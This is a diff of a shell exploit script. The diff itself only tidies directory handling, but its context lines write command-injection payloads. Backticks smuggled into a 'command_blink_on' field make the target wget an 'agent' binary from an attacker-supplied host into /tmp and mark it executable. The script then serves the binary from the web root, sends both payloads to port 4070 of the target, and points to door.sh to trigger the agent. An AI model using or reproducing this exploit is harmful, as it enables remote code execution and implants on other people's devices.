@@ -35,8 +35,13 @@ then
 fi
 
 echo "[*] Creating Data Files."
-mkdir ./datafiles
-cd ./datafiles
+if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
+then
+  mkdir datafiles
+  cd ./datafiles
+else
+  cd ./datafiles
+fi
 echo 'command_blink_on;044;'$2';1`wget -O /tmp/agent http://'$3'/a`;' > data1.txt
 echo 'command_blink_on;044;'$2';1`chmod +x /tmp/agent`;' > data2.txt
 cp ../tools/agent /var/www/html/a
@@ -50,6 +55,6 @@ echo ""
 echo "[*] Sending Payload 2"
 ${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 $1 2> /dev/null
 echo ""
-
+cd ../
 echo "[*] 'agent' Script Deployed."
 echo "[*] Use door.sh to trigger the agent script."
